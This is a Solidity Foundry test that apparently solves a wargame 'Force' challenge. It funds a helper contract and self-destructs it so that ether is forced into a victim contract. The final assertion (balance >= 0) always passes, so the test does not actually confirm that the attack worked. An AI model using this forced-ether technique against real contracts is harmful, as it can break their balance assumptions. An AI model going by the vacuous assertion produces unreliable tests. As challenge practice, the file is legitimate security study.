// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract ForceTest is Test {
    Force public c;
    Destroyer public d;
    address p = address(1337);

    function setUp() public {
        vm.deal(p, 1 ether);
        c = new Force();
        d = new Destroyer();
    }

    /// @dev Make balance of contract > 0
    function testAttack() public {
        vm.startPrank(p);
        /// @dev send some funds to the destroyer contract
        bool sent = payable(address(d)).send(0.5 * 1 ether);
        require(sent, "funding tx did not work");
        /// @dev selfdestruct destroyer contract, funds are forced to victim
        d.byebye(payable(address(c)));
        vm.stopPrank();
        /// @dev assert balance of victim > 0
        assertGe(address(c).balance, 0);
    }
}
